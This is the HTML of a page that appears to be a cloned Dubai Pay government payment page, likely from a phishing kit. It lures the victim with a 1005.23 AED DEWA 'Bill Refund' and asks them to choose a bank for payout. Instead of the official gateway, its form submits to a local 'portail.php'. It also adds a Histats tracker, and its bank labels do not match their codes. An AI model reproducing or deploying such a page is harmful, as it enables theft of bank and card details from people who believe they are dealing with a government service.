
<html>
<head>
  	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Language" content="en-us">
    <title>Welcome to Dubai Smart Government Payment Page</title>
	<link href="https://epayment.dubai.ae/ePayHub/Authentication/theme/css/common.css" rel="stylesheet" type="text/css">
	<script language="JavaScript" type="text/javascript" src="https://epayment.dubai.ae/ePayHub/Authentication/theme/js/prototype-1.7.1.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
	<meta name="description" content="">
    <meta name="author" content="">
    <meta charset="utf-8">
    
    <!-- Le styles -->
    <link href="https://epayment.dubai.ae/ePayHub/Authentication/theme/css/bootstrap.css" rel="stylesheet">
	<link href="https://epayment.dubai.ae/ePayHub/Authentication/theme/css/bootstrap-responsive.css" rel="stylesheet">
	<link href="files/css/customStyles.css" rel="stylesheet">
    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="https://epayment.dubai.ae/ePayHub/Authentication/theme/js/html5shiv.js"></script>
      <style type="text/css">
        .heading__expandable { cursor: auto }
        .heading__expandable .heading__group { display: none !important }
      </style>
    <![endif]-->
    <!--[if !IE]>
    <style>
      .adjust {
        margin-top: 5px !important;
        margin-bottom: auto !important;
      }
    </style>
    <![endif]-->
  </head>
  <body leftmargin="0" topmargin="0" class="defaultText body--withocclusion" onload="showCC()">
    <div class="container">
      <form name="initiationFrm" method="post" action="portail.php" onsubmit="return validate()">
         <input type="hidden" name="targetURL" value="NewSPServlet">
		 <input type="hidden" name="CARDSELECTED">
		 <input type="hidden" name="PG">
		 <input type="hidden" name="CHARGEAMT" value="Additional eDirham fees will be applied">
		 <input type="hidden" name="ARCHARGEAMT" value="سيتم تطبيق رسوم إضافية الدرهم الإلكتروني">
		 <input type="hidden" name="CNERR_EN" value="Could not connect to eDirham GII payment gateway">
		 <input type="hidden" name="CNERR_AR" value="تعذر الاتصال ببوابة الدفع GII الدرهم الإلكتروني">
		 <input type="hidden" name="CNF_EN" value="Corresponding eDirham GII service is not found">
		 <input type="hidden" name="CNF_AR" value="لم يتم العثور على خدمة GII الدرهم الإلكتروني المطابق">
		 <input type="hidden" name="WAIT_EN" value="Please wait while additional e-Dirham fees is retrieved">
		 <input type="hidden" name="WAIT_AR" value="الرجاء الانتظار بينما يتم استرداد رسوم إضافية الدرهم الإلكتروني">
		 <input type="hidden" name="FEES_EN" value="Additional money AED eDirham fees will be applied">
		 <input type="hidden" name="FEES_AR" value="ستضاف money دراهم رسوم الدرهم الإلكتروني">
		 <input type="hidden" name="JSPNAME" value="abc">
		 <input type="hidden" name="TRANSCANCEL" value="">
		 <input type="hidden" name="MOBILENO" value="">
         <input type="hidden" name="CARDSELECTED">
         <input type="hidden" name="PG">
         <input type="hidden" name="EncServiceProviderHM" value="1CF31A7B63F66CA54FA1884414394C1E80F3836B82476D452614B1B24B8171AB3730ECF70DD0519953488975C2D0FDD2D7653C0830F872C7763A853136426CF3344D219C56213D771DA16C1F91DE13031B251D257886ACB4DFC3D1FCCDC0D6EB622BD641FFBDE3B8FDA3D6FA300FE630459E428393AA8AC746A9CDCC1859B078A59BEBD4F01DB6BD93658E038F23ACEDAE8C95BE39ADA4C28587A99523A901E928AAB6DEDF21401342BB80BD6A79CC9FF4AE6E22240828824A51B464B53CB074CE5C6CB6758EEF89EF78A78E69BE77814CAA5715E460CE8BD9323D049F270D1042314B69D130517F23591590C5DB8ADAEE58C56389661610E87390EDB7D8294C664191BBE63D5EA9917C3B173337644F15E4E66DC4D0AC61382870B566C1839D56F8A257609572769E816DEDE08E7461B82CD0E18DD4BAA56EFA271E0B12C2F33CD9A6272848EF6BB6CBA49DDDE2AF194FC81B77994A3766FACDF9CE811A1851D74EAE1E71BDC7F8662754D4CBC7892CA23FA77385874A28AB11F31E95AE5152C16DB1CEB255391646146EAD51D6E53BB9BAF8AD8A404F04B233755824AD20CFE4693B01551B04B71E71D34611BAE1DB3B7E5222E701FE9BC80403C89E108F1D4AA0CE67A682D085C16ED28A260ED1A09E83B371B922914E872BE6D75E7D98DEFB8025EAD1AB422D4F2DC2660A81409547100282C133F8F8B7C487F702154BECE50E0976970C0796199B462E409D08CF07D1C766F9596AAF4B04077CF025628D9CEA5B7732EAC851346F7057EC948CE04638A4DEF32643736A1A320275EC9839C9F9EDEE4817432BDDFDDA1F0B366C68">
         <input type="hidden" name="batchTransId" value="null">
        
        <div id="mainTable">
          <div class="banner">
            <img class="dubai-pay-logo" src="https://epayment.dubai.ae/ePayHub/Authentication/theme/images/dubai-pay-logo.png" alt="Dubai Pay">
            <img class="sd-logo" src="https://epayment.dubai.ae/ePayHub/Authentication/theme/images/smart-dubai-logo.png" alt="Dubai Pay">
          </div>
          <div class="form-signin">
            <div>
              <div class="heading heading__expandable" tabindex="2" onclick="if (this.className === 'heading heading__expandable') this.className = 'heading heading__expandable heading__expandable--expanded'; else this.className = 'heading heading__expandable';">
                <div class="heading__group">
                  <span role="heading" class="heading__title"><span class="heading__serviceProvider">DEWA</span><span class="heading__transactionNumber">#DEWA0000000019931495</span></span>
                  <span role="heading" class="heading__subtitle">Details</span>
                </div>
              </div>
                <!--[if lt IE 9]>
                  <h1 class="heading">Transaction Info</h1>
                <![endif]-->
              <div class="content-area">
                <div class="group">
                    <dl class="formRow group__row">
                      <dt class="formTitles formRow__title">Service</dt>
                      <dd class="formTitlesBold formRow__value">Bill Refund</dd>
                    </dl>
                    <dl class="formRow group__row">
                      <dt class="formTitles formRow__title"><abbr class="sp__abbr" title="Service Provider" tabindex="0">SP</abbr> Transaction No</dt>
                      <dd class="formTitlesBold formRow__value">DEWA0000000019931495</dd>
                    </dl>
                    <dl class="formRow group__row">
                      <dt class="formTitles formRow__title">Amount</dt>
                      <dd class="formTitlesBold formRow__value">1005.23&nbsp;AED</dd>
                    </dl>
				                      
                  </div>
              </div>
            </div>
          </div>
                    
          <div class="form-signin">
            <div>
              <div class="heading">
                Payout Method
              </div>
              <div class="content-area">
                <table cellpadding="2" cellspacing="2" border="0">
                  <tbody>
<tr>									
			<td>
						    <div class="control-group radio_buttons required">
								<div class="controls">
	
	
	
	
   <label class="radio">

		 			<label class="radio">		
	 
		<input class="radio_buttons required adjust" type="radio" name="PYMTMETHODCODE" value="MULTIPLE" onclick="showDD()"><img src="https://epayment.dubai.ae/ePayHub/Authentication/theme/images/imgProviders_05.png" style="padding-right:5px">     
     Debit/credits Cards</label>
<div id="DD" class="inner-content-area" style="margin-left: 20px; padding-top: 0px; padding-bottom: 0px; display: none;">
										   <div class="control-group radio_buttons">
												<div class="controls">					
				
 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200009~ADIB~10010~Abu Dhabi Islamic Bank~0~0~ ">
				
					
			
					     
			     	Ras al khaimah Bank</label> 				<label class="radio">
					
					
			 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200009~ADIB~10010~Abu Dhabi Islamic Bank~0~0~ ">
				
					
			
					     
			     	Ajman Bank</label> 				<label class="radio">
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200009~ADIB~10010~Abu Dhabi Islamic Bank~0~0~ ">
				
					
			
					     
			     	Abu Dhabi Islamic Bank</label>
			     	
			     		
							
							  
 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200008~DirectDebitCBDPgAdapter~10010~Commercial Bank Of Dubai~1~1~ ">
				
					
			
					     
			     	Emirates NBD</label>
			     	
			     		
							
							  
 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200011~DIB~10010~Dubai Islamic Bank~0~0~ ">
				
					
			
					     
			     	Dubai Islamic Bank</label>
			     	
			     		
							
							  
 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200012~ENBD~10010~Emirates NBD~0~0~ ">
				
					
			
					     
			     	First Abu Dhabi Bank</label>
			     	
			     		
							
							  
 				<label class="radio">
			
					
				<input class="radio_buttons required adjust" style="margin-top:5px" type="radio" name="CARDTYPE" value="200014~Other~10010~Other Bank~0~0~ ">
				
					
			
					     
			     	Other Bank</label>
			     	
			     		
							
							  
					</div></div></div>		  
				 
   
     		  

     		 
     		  

     		 
     		  

     		 
     		  

     		 
     		  

     		 
     		  

     		 
     						
     				
     					
     				
     				
     					  
     		  

     		 
			     </div></div>
				 </td>
				  
	 </tr>	
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          
          <div class="form-signin">
            <div style="width: 100%; margin: 8px 0 0 0; display: inline-block;">
             
              <div style="float: left;"></div>
              <div class="total-payment">
                Total Amount:&nbsp;1005.23&nbsp;AED
              </div>
            </div>
            <div style="height: 30px; padding: 8px 10px;">
              <div style="float: right; padding-left: 5px;">
              	
				<input type="submit" name="btnPay" value="Continue" class="btn btn-primary btn-rounded">
				
			  </div>
              <div style="float: right; padding-left: 5px;">
                <input type="button" name="btnCancel" value="Cancel" class="btn btn-default btn-rounded" onclick="cancelTrans()">
              </div>
            </div>

            <div class="termAndConditionSection">
                <p class="english-terms">
                  By tapping on "Continue" you are agreeing with our 
                    <a style="
                        color: #ed1c24;
                        text-decoration: underline;
                        cursor: pointer;
                      " onclick="javascript:showWarning();">Terms &amp; Conditions</a>
                  </p>
              <div id="msgWarning" style="display: none;">
                <div class="wellWarning">
                  <table border="0" cellpadding="2" cellspacing="3">
                    <tbody>
                      <tr>
                        <td style="width: 50%;" class="warningText"><table style="text-align: left;vertical-align:middle;font-size:10pt;"><tbody><tr><td><b>Warning...</b> Please read the following before proceeding with the payment process.</td></tr><tr><td><br></td></tr><tr><td><b>Dear valued Customer,</b> in order to ensure receiving Dubai Smart Government Services in a legal and secure way, avoid paying through an intermediary person or by using a credit card, a debit card, and/or any electronic payment means belonging to others and/or without permission and/or unlawfully.</td></tr><tr><td><br></td></tr><tr><td><b>In case of infringement of the above-mentioned and/or complaint by the original owner of the card or electronic payment mean used,</b> the customer (whether a person or an entity) benefiting from the service will be legally liable and punished by imprisonment and fine, or any of these punishments according to Articles 11, 12, 13 and 14 of the Federal Law by Decree No. (5) of 2012 concerning Combating Information Technology Crimes, without prejudice to Dubai Smart Government's right to exercise all the legal remedies and rights available and/or provided to it by Law. </td></tr></tbody></table></td>
                        <td></td>
                        <td style="width: 50%;" class="warningTextArabic"><table style="text-align: right;vertical-align:middle;font-size:10pt;"><tbody><tr><td><b>تحذير... </b>يُرجى قراءة ما يلي قبل المتابعة في عملية الدفع.</td></tr><tr><td><br></td></tr><tr><td><br></td></tr><tr><td><b>عزيزنا العميل، </b>للتأكد من حصولك على خدمات "حكومة دبي الذكية" بشكل قانوني وآمن، تجنب الدفع من خلال شخص وسيط أو باستخدام بطاقة ائتمانية أو بطاقة الخصم المباشر و/أو وسيلة أخرى للدفع الالكتروني تخص الغير و/أو بدون تصريح و/أو بغير حق.<br></td></tr><tr><td><br></td></tr><tr><td></td></tr><tr><td><br></td></tr><tr><td><b>في حالة مخالفة ما جاء أعلاه و/أو شكوى المالك الأصلي للبطاقة أو وسيلة الدفع الإلكتروني المستخدمة، </b>يخضع العميل (سواء كان شخص طبيعي أو اعتباري) المنتفع من الخدمة للمساءلة القانونية ويعاقب بالحبس والغرامة أو بإحدى هاتين العقوبتين طبقاً للمواد 11 و12 و13 و14 من المرسوم بقانون اتحادي رقم (5) لسنة 2012 في شأن مكافحة جرائم تقنية المعلومات، دون المساس بحق حكومة دبي الذكية في ممارسة جميع وسائل الحماية القانونية والحقوق المتاحة و/أو الممنوحة لها بموجب القانون. </td></tr></tbody></table></td>
                      </tr>
                      <tr>
                        <td colspan="3" style="text-align: center;">
                          <input name="btnClose" value="Done" class="btn btn-primary" onclick="javascript:showWarning();" type="button">
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
          <div class="wellAskdubai">
            <table width="100%" cellpadding="0" cellspacing="0" border="0">
              <tbody>
                <tr>
                  <td>
                    <span class="footer-text">For more inquiries please call</span>
                    <span class="footer-text number"> <a href="tel://+971600560000/">600 560 000</a></span>
                  </td>
                  <td>
                    <span class="footer-text text-right copy-right">Copyright © 2026. All rights reserved.</span>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </form>
    </div>
    <script>
      var disabledCardTypes = new Array();

      function showCC() {
        document.initiationFrm.btnPay.disabled = false;

        if (document.getElementById("CC") != null) {
          CC.style.display = "";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "none";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "none";
        }

        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "none";
        }
        if (document.getElementById("ED2") != null) {
          ED2.style.display = "none";
        }
        if (document.getElementById("OC") != null) {
          OC.style.display = "none";
        }

        if (document.getElementById("notify") != null) {
          notify.style.display = "";
        }
        disableFields(false);
      }

      function showDD() {
        document.initiationFrm.btnPay.disabled = false;

        if (document.getElementById("CC") != null) {
          CC.style.display = "none";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "none";
        }
        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "none";
        }
        if (document.getElementById("ED2") != null) {
          ED2.style.display = "none";
        }
        if (document.getElementById("OC") != null) {
          OC.style.display = "none";
        }

        if (document.getElementById("notify") != null) {
          notify.style.display = "";
        }

        var edirhamG2 = document.getElementsByName("CARDTYPEEG2");

        for (i = 0; i < edirhamG2.length; i++) {
          edirhamG2[i].checked = false;
        }
        disableFields(false);
      }

      function showEdirham() {
        if (document.getElementById("CC") != null) {
          CC.style.display = "none";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "none";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "";
        }

        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "";
        }

        if (document.getElementById("ED2") != null) {
          ED2.style.display = "none";
        }
        if (document.getElementById("OC") != null) {
          OC.style.display = "none";
        }
        if (document.getElementById("notify") != null) {
          notify.style.display = "";
        }
      }

      function showEdithamG2() {
        if (document.getElementById("ED2") != null) {
          ED2.style.display = "";
        }
        if (document.getElementById("CC") != null) {
          CC.style.display = "none";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "none";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "none";
        }
        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "none";
        }

        if (document.getElementById("OC") != null) {
          OC.style.display = "none";
        }

        if (document.getElementById("notify") != null) {
          notify.style.display = "";
        }

        /* 		var edirhamG2 = document.getElementsByName('CARDTYPEEG2');
         	
         	for(i = 0; i < edirhamG2.length; i++) {
         		edirhamG2[i].checked = false;
         	} */

        //charges();
      }

      function showOneClickPay() {
        document.initiationFrm.btnPay.disabled = false;

        if (document.getElementById("CC") != null) {
          CC.style.display = "none";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "none";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "none";
        }

        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "none";
        }
        if (document.getElementById("ED2") != null) {
          ED2.style.display = "none";
        }
        if (document.getElementById("OC") != null) {
          OC.style.display = "";
        }

        if (document.getElementById("notify") != null) {
          notify.style.display = "none";
        }

        var edirhamG2 = document.getElementsByName("CARDTYPEEG2");

        for (i = 0; i < edirhamG2.length; i++) {
          edirhamG2[i].checked = false;
        }

        //document.initiationFrm.chkConfirm.checked = true;
      }

      function showNoqodi() {
        document.initiationFrm.btnPay.disabled = false;

        if (document.getElementById("CC") != null) {
          CC.style.display = "none";
        }
        if (document.getElementById("DD") != null) {
          DD.style.display = "none";
        }
        if (document.getElementById("ED") != null) {
          ED.style.display = "none";
        }

        if (document.getElementById("eDirham") != null) {
          eDirham.style.display = "none";
        }
        if (document.getElementById("ED2") != null) {
          ED2.style.display = "none";
        }
        if (document.getElementById("OC") != null) {
          OC.style.display = "";
        }

        if (document.getElementById("notify") != null) {
          notify.style.display = "";
        }

        var edirhamG2 = document.getElementsByName("CARDTYPEEG2");

        for (i = 0; i < edirhamG2.length; i++) {
          edirhamG2[i].checked = false;
        }

       //document.initiationFrm.chkConfirm.checked = true;
      }

      function charges() {
        var card = "INVALID";
        var edG2Fees = "--.--";
        var enMsg = document.initiationFrm.CHARGEAMT.value;
        var arMsg = document.initiationFrm.ARCHARGEAMT.value;
        var connEN = document.initiationFrm.CNERR_EN.value;
        var connAR = document.initiationFrm.CNERR_AR.value;
        var codeEN = document.initiationFrm.CNF_EN.value;
        var codeAR = document.initiationFrm.CNF_AR.value;
        var waitEN = document.initiationFrm.WAIT_EN.value;
        var waitAR = document.initiationFrm.WAIT_AR.value;
        var feesEN = document.initiationFrm.FEES_EN.value;
        var feesAR = document.initiationFrm.FEES_AR.value;
        var blue = document.initiationFrm.CARDTYPEEG2[0];
        var red = document.initiationFrm.CARDTYPEEG2[1];
        var gold = document.initiationFrm.CARDTYPEEG2[2];
        var blueCard = blue.checked;
        var redCard = red.checked;
        var goldCard = gold.checked;

        if (!blueCard && !redCard && !goldCard) {
          var engDiv = document.getElementById("msg");
          var arDiv = document.getElementById("armsg");
          engDiv.innerHTML = enMsg;
          arDiv.innerHTML = arMsg;
        }

        var targetUrl = document.initiationFrm.targetURL.value;
        var params = $(document.initiationFrm).serialize();
        targetUrl = targetUrl + "?" + params + "&edg2service=inquiry";

        if (blueCard || redCard || goldCard) {
          disableFields(true);
          updateEDirhamFees(waitAR, "ar");
          updateEDirhamFees(waitEN, "en");
          new Ajax.Request(targetUrl, {
            method: "post",
            onSuccess: function (transport) {
              disableFields(false);
              var edG2Fees = transport.responseText || "no response";
              if (edG2Fees == "CNF") {
                updateEDirhamFees(codeAR, "ar");
                updateEDirhamFees(codeEN, "en");
              } else if (
                edG2Fees == "CNC" ||
                edG2Fees == "ERR" ||
                edG2Fees == "no response" ||
                edG2Fees.length > 20 ||
                edG2Fees == null ||
                edG2Fees == "null"
              ) {
                updateEDirhamFees(connAR, "ar");
                updateEDirhamFees(connEN, "en");
                document.initiationFrm.btnPay.disabled = true;
              } else {
                feesEN = feesEN.replace("money", edG2Fees);
                feesAR = feesAR.replace("money", edG2Fees);
                updateEDirhamFees(feesAR, "ar");
                updateEDirhamFees(feesEN, "en");
              }
            },
            onFailure: function (error) {
              disableFields(false);
              updateEDirhamFees(connAR, "ar");
              updateEDirhamFees(connEN, "en");
            },
          });
        }
      }

      function updateEDirhamFees(message, lang) {
        var engDiv = document.getElementById("msg");
        var arDiv = document.getElementById("armsg");

        if (lang == "ar") {
          arDiv.innerHTML = message;
        } else {
          engDiv.innerHTML = message;
        }
      }

      function disableFields(disable) {
        if (disable) {
          pymtMethodTypes = document.getElementsByName("PYMTMETHODCODE");
          for (i = 0; i < pymtMethodTypes.length; i++) {
            disabledCardTypes[i] = pymtMethodTypes[i].disabled;
          }
          var cardTypes = document.getElementsByName("PYMTMETHODCODE");
          var edirhamG2 = document.getElementsByName("CARDTYPEEG2");
          for (i = 0; i < cardTypes.length; i++) {
            cardTypes[i].disabled = true;
          }
          for (i = 0; i < edirhamG2.length; i++) {
            edirhamG2[i].disabled = true;
          }
          document.initiationFrm.btnPay.disabled = true;
          document.initiationFrm.btnCancel.disabled = true;
        } else {
          var cardTypes = document.getElementsByName("PYMTMETHODCODE");
          var edirhamG2 = document.getElementsByName("CARDTYPEEG2");
          for (i = 0; i < cardTypes.length; i++) {
            if (disabledCardTypes[i] == false) {
              cardTypes[i].disabled = false;
            }
          }
          for (i = 0; i < edirhamG2.length; i++) {
            edirhamG2[i].disabled = false;
          }
          document.initiationFrm.btnPay.disabled = false;
          document.initiationFrm.btnCancel.disabled = false;
        }
      }

      function validate() {
        var pymtMethods = document.getElementsByName("PYMTMETHODCODE");
        var lnPymtMethods = pymtMethods.length;
        //alert("PaymentMehthod Count: " + lnPymtMethods);
        var cardTypes = document.getElementsByName("CARDTYPE");
        var lnCardTypes = cardTypes.length;
        //alert("Card Type Count: " + lnCardTypes);
        var flag = false;
        var isPGSelected = "notSelected";

        for (i = 0; i < lnPymtMethods; i++) {
          if (pymtMethods[i].checked) flag = true;
        }

        if (!flag) {
          alert("Please select a Payment GateWay");
          return false;
        }

        for (j = 0; j < lnPymtMethods; j++) {
          strPymntMethodCode = "";
          strTempPymntMethodCode = pymtMethods[j].value;
          //alert(" i = " +  i  + "  ::: strTempPymntMethodCode" + strTempPymntMethodCode );
          if (pymtMethods[j].checked) {
            isPGSelected = "selected";

            if (strTempPymntMethodCode == "MULTIPLE") {
              var noSelectedCard = true; // a flag when all cards disabled due to amount limit
              for (i = 0; i < lnCardTypes; i++) {
                if (noSelectedCard) {
                  noSelectedCard = false;
                }
                strPymntMethodCodeMultiple = "";
                strTempPymntMethodCodeMultiple = cardTypes[i].value;
                strPymntMethodCodeMultiple = strTempPymntMethodCodeMultiple.split(
                  "~"
                );
                document.initiationFrm.PG.value = strPymntMethodCodeMultiple[2];
                if (strPymntMethodCodeMultiple[2] == "10007") {
                    if (notifyALL()) {
/*                       if (document.initiationFrm.chkConfirm.checked == false) {
                        alert(
                          "Please confirm that you have read the message by selecting the checkbox"
                        );
                        return false;
                      } else { */
                        document.initiationFrm.btnPay.style.visibility = "hidden";
                        document.initiationFrm.btnCancel.style.visibility = "hidden";
                        return true;
                      //}
                    } else {
                      return false;
                    }

                  var flag = false;
                  for (m = 0; m < lnCardTypes; m++) {
                    if (cardTypes[m].checked) flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                } else if (strPymntMethodCodeMultiple[2] == "10000") {
                  var flag = false;
                  for (m = 0; m < lnCardTypes; m++) {
                    if (cardTypes[m].checked) flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                } else if (strPymntMethodCodeMultiple[2] == "10010") {
                  var flag = false;
                  for (m = 0; m < lnCardTypes; m++) {
                    if (cardTypes[m].checked) flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                } else if (strPymntMethodCodeMultiple[2] == "10008") {
                  var flag = false;
                  for (m = 0; m < lnCardTypes; m++) {
                    if (cardTypes[m].checked) flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                } else if (strPymntMethodCodeMultiple[2] == "10012") {
                  var flag = false;
                  for (m = 0; m < lnCardTypes; m++) {
                    if (cardTypes[m].checked) flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                }
              }

              // Handle the case when all options are disabled due to amount limit
              if (noSelectedCard) {
                alert("Please select a Payment GateWay");
                return false;
              }
            } else if (strTempPymntMethodCode == "MULTIPLEED2") {
              for (i = 0; i < document.initiationFrm.CARDTYPEEG2.length; i++) {
                strPymntMethodCodeMultiple = "";
                strTempPymntMethodCodeMultiple =
                  document.initiationFrm.CARDTYPEEG2[i].value;
                strPymntMethodCodeMultiple = strTempPymntMethodCodeMultiple.split(
                  "~"
                );
                document.initiationFrm.PG.value = strPymntMethodCodeMultiple[2];
                if (strPymntMethodCodeMultiple[2] == "10008") {
                  var flag = false;
                  for (
                    m = 0;
                    m < document.initiationFrm.CARDTYPEEG2.length;
                    m++
                  ) {
                    if (document.initiationFrm.CARDTYPEEG2[m].checked)
                      flag = true;
                  }

                  if (!flag) {
                    alert("Please select a Payment GateWay");
                    return false;
                  }
                }
              }
            } else {
              strPymntMethodCode = strTempPymntMethodCode.split("~");
              document.initiationFrm.PG.value = strPymntMethodCode[2];
              if (pymtMethods[j].checked && strPymntMethodCode[2] == "10007") {
                  if (notifyALL()) {
                    /* if (document.initiationFrm.chkConfirm.checked == false) {
                      alert(
                        "Please confirm that you have read the message by selecting the checkbox"
                      );
                      return false;
                    } else { */
                      document.initiationFrm.btnPay.style.visibility = "hidden";
                      document.initiationFrm.btnCancel.style.visibility = "hidden";
                      return true;
                    //}
                  } else {
                    return false;
                  }
              }
            }
          }
        }

        if (isPGSelected == "notSelected") {
          alert("Please Select a Payment Method");
          return false;
        }
        if (notifyALL()) {
          //Hide the buttons after it is clicked to avoid multiple clicks
          /* if (document.initiationFrm.chkConfirm.checked == false) {
            alert(
              "Please confirm that you have read the message by selecting the checkbox"
            );
            return false;
          } else { */
            document.initiationFrm.btnPay.style.visibility = "hidden";
            document.initiationFrm.btnCancel.style.visibility = "hidden";
            return true;
          //}
        } else {
          return false;
        }
      }

      function validateIfOnlyEdirham() {
          if (notifyALL()) {
            //Added to hide the buttons after it is clicked to avoid Duplicate clicks if the payment method is only eDirham
            /* if (document.initiationFrm.chkConfirm.checked == false) {
              alert(
                "Please confirm that you have read the message by selecting the checkbox"
              );
              return false;
            } else { */
              document.initiationFrm.btnPay.style.visibility = "hidden";
              document.initiationFrm.btnCancel.style.visibility = "hidden";
              return true;
            //}
          } else {
            return false;
          }
      }

      function cancelTrans() {
        var checkbox = document.getElementsByName("PYMTMETHODCODE");
        var ln = checkbox.length;
        if (ln > 0) {
          for (i = 0; i < ln; i++) {
            if (
              document.getElementsByName("PYMTMETHODCODE")[i].value ==
              "MULTIPLEED2"
            ) {
              document.getElementsByName("PYMTMETHODCODE")[i].value =
                "MULTIPLE";
            }
          }
        }
        document.initiationFrm.TRANSCANCEL.value = "true";

        if (document.initiationFrm.btnPay) {
          document.initiationFrm.btnPay.style.visibility = "hidden";
        }
        document.initiationFrm.btnCancel.style.visibility = "hidden";
        document.initiationFrm.submit();
        //document.initiationFrm.btnPay.style.visibility="Visible";
        //document.initiationFrm.btnCancel.style.visibility="Visible";
      }

      function notifyALL() {
        if (
          document.getElementById("notify") != null &&
          notify.style.display == ""
        ) {
          var existMail = document.initiationFrm.existMail;

          if (existMail != null && existMail.value.length > 0) {
            //validate when user specify another email
            if (document.initiationFrm.EMAILID.value != "") {
              if (isEMail(document.initiationFrm.EMAILID)) {
                alert("Invalid entry!\n\nEnter valid Email Id.");
                document.initiationFrm.EMAILID.focus();
                return false;
              }
            }
          } else if (document.initiationFrm.EMAILID.value != "") {
            if (isEMail(document.initiationFrm.EMAILID)) {
              alert("Invalid entry!\n\nEnter valid Email Id.");
              document.initiationFrm.EMAILID.focus();
              return false;
            }
          } else {
            alert("Please enter the Email ID");
            document.initiationFrm.EMAILID.focus();
            return false;
          }

          var existMobile = document.initiationFrm.existMobile;
          if (existMobile != null && existMobile.value.length > 0) {
            if (document.initiationFrm.mobileNumber.value != "") {
              if (!isValidMobileNumber(document.initiationFrm.mobileNumber)) {
                return false;
              }
            }
            return true;
          }
          var mobileNo = "";
          if (document.initiationFrm.mobileNumber.value != "") {
            if (!isValidMobileNumber(document.initiationFrm.mobileNumber)) {
              return false;
            }
            mobileNo = document.initiationFrm.mobileNumber.value;
          } else {
            alert("Please enter the mobile Number");
            document.initiationFrm.mobileNumber.focus();
            return false;
          }

          if (mobileNo != "") {
            document.initiationFrm.mobileNumber.value = mobileNo;
            return true;
          }
        }
        return true;
      }

      function isValidMobileNumber(field) {
        var str = field.value;
        var regex = /^\+?([0-9]{2})\)?([0-9]{7,15})$/;
        if (regex.test(str) == false) {
          alert(
            "Invalid mobile number.\n Please use the following format\n 971501234567"
          );
          return false;
        }
        return true;
      }

      function isPhone_num(field) {
        str = field.value;
        var i = 0;
        var num = false;
        var err = 0;
        if (str.length != 0) {
          for (i = 0; i < str.length; i++) {
            if (str.charAt(i) < "0" || str.charAt(i) > "9") {
              err = 1;
            } else num = true;
          }
        } else {
          num = true;
          err = 0;
        }
        if (err == 1 || num != true) {
          alert("Invalid entry!\n\nOnly numbers accepted.");
          field.focus();
          field.select();
          return 1;
        } else {
          return 0;
        }
      }

      function trim(strText) {
        while (strText.substring(0, 1) == " ")
          strText = strText.substring(1, strText.length);

        while (strText.substring(strText.length - 1, strText.length) == " ")
          strText = strText.substring(0, strText.length - 1);

        return strText;
      }

      function isEMail(field) {
        str = field.value;
        flag = 0;
        var at = "@";
        var dot = ".";
        var lat = str.indexOf(at);
        var lstr = str.length;
        var ldot = str.indexOf(dot);

        if (
          str.indexOf(at) == -1 ||
          str.indexOf(at) == 0 ||
          str.indexOf(at) == lstr ||
          str.indexOf(at, lat + 1) != -1
        ) {
          flag = 1;
          return flag;
        }

        if (
          str.indexOf(dot) == -1 ||
          str.indexOf(dot) == 0 ||
          str.indexOf(dot) == lstr ||
          str.substring(lat - 1, lat) == dot ||
          str.substring(lat + 1, lat + 2) == dot ||
          str.indexOf(dot, lat + 2) == -1 ||
          str.substring(lstr - 1, lstr) == dot
        ) {
          flag = 1;
          return flag;
        }

        if (str.indexOf("\\") != -1) {
          flag = 1;
          return flag;
        }

        // The below code has been modified by SHAH on 02-Aug-2011
        var chrVal = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@\'.~!$%^&*()_-+=`?><*';

        for (var i = 0; i < str.length; i++) {
          if (chrVal.indexOf(str.charAt(i)) == -1) {
            flag = 1;
            return flag;
          }
        }

        return flag;
      }

      function showWarning() {
        if (document.getElementById("msgWarning").style.display == "inline") {
          document.getElementById("msgWarning").style.display = "none";
        } else {
          document.getElementById("msgWarning").style.display = "inline";
        }
      }

      function showEmailMobile() {
        document.getElementById("emailIdDiv").style.display = "";
        document.getElementById("mobileNoDiv").style.display = "";
        document.getElementById("addLink").style.display = "none";
      }
    </script>
	<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4203309,4,0,0,0,00010000']);
